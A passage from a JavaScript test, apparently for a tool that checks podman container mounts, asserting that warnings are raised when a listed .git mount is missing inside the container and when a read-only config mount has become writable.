        { Destination: '/w/foo/.git', RW: false }, { Destination: '/w/cfg', RW: false }], live);
    assert.equal(warnings.length, 2);
    assert.match(warnings[0], /podman lists a mount at \/w\/foo\/\.git, but it isn't there inside/);
    assert.match(warnings[1], /podman made \/w\/cfg read-only, but inside it's writable now/);
});
